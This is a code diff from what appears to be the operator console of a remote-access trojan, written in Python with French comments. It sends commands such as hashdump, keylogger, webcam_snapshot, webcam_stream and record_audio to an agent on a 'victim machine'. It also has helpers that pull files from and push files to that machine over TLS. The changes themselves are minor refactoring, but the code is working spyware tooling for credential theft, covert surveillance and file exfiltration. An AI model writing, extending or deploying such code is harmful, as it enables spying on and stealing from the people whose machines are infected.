@@ -283,18 +283,17 @@ def interact_with_session(session_id: int) -> None:
                 "hashdump",
                 "keylogger",
                 "webcam_snapshot",
-                "webcam_stream",
-                "record_audio",
             ):
                 response = send_command_and_recv(conn, command)
                 _print_response(response)
 
-            # --- record_audio [duration] ---
-            elif command == "record_audio" or command.startswith("record_audio "):
+            # --- record_audio [durée optionnelle] ---
+            elif command.startswith("record_audio"):
                 parts = command.split(maxsplit=1)
                 duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                 response = send_command_and_recv(conn, "record_audio", {"duration": duration})
                 _save_audio(response)
+
             # --- Webcam stream ---
             elif command == "webcam_stream":
                 _webcam_stream_session(conn, session_id)
@@ -448,9 +447,6 @@ def _download_file(conn: socket.socket, remote_path: str) -> None:
         conn: Socket TLS de l'agent.
         remote_path: Chemin du fichier sur la machine victime.
     """
-    import base64
-    from pathlib import Path
-
     conn.sendall(encode_message({"type": "command", "command": "download", "path": remote_path}))
     data = conn.recv(10 * 1024 * 1024)  # 10 MB max
     response = decode_message(data.decode("utf-8").strip())
@@ -477,9 +473,6 @@ def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
         local_path: Chemin local du fichier à envoyer.
         session_id: Identifiant de la session (pour les logs).
     """
-    import base64
-    from pathlib import Path
-
     path = Path(local_path)
     if not path.exists():
         print(f"[!] Fichier introuvable : {local_path}")
@@ -512,10 +505,6 @@ def _save_audio(response: dict[str, Any]) -> None:
     Args:
         response: Agent response dict containing 'data' (base64 WAV) or 'error'.
     """
-    import base64
-    import time
-    from pathlib import Path
-
     if response.get("error"):
         print(f"[!] record_audio error: {response['error']}")
         return
